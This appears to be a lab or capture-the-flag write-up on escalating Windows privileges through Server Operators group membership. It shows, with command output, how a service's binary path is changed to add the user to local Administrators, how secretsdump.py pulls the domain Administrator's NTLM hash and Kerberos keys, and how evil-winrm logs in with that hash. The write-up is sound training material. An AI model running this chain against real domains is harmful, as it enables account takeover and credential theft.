The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful ==`SeBackupPrivilege`== and ==`SeRestorePrivilege`== privileges and the ability to control local services.

use sc.exe to find the service which is running as system.

```
C:\Users\server_adm> sc qc AppReadiness
[SC] QueryServiceConfig SUCCESS


SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service.
```


C:\Users\server_adm>c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All


```

Let's change the binary path to execute a command which adds our current user to the default local administrators group.
```
C:\Users\server_adm>sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS

```

start the service and it will fail as we expected now you can check the local administrators group members.
```
C:\Users\server_adm>sc start AppReadiness
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

```
C:\Users\server_adm> net localgroup Administrators net localgroup Administrators
C:\Users\server_adm> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.

```

as we are in the admin group now we will dump the hashes 
```
└─$ secretsdump.py server_adm@10.129.43.42 -just-dc-user administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f220c24907b50fe1666a8227013389f60c775440806853065f80d9ecbe5a4a18
Administrator:aes128-cts-hmac-sha1-96:9f9f3c7d7a4db1dc88197c0b00b444f9
Administrator:des-cbc-md5:a7fe6bceb9975107
[*] Cleaning up... 

```

use evil-winrm to connect and grab the flag.

```
└─$ evil-winrm -i 10.129.43.42 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type c:\Users\Administrator\Desktop\ServerOperators\flag.txt

```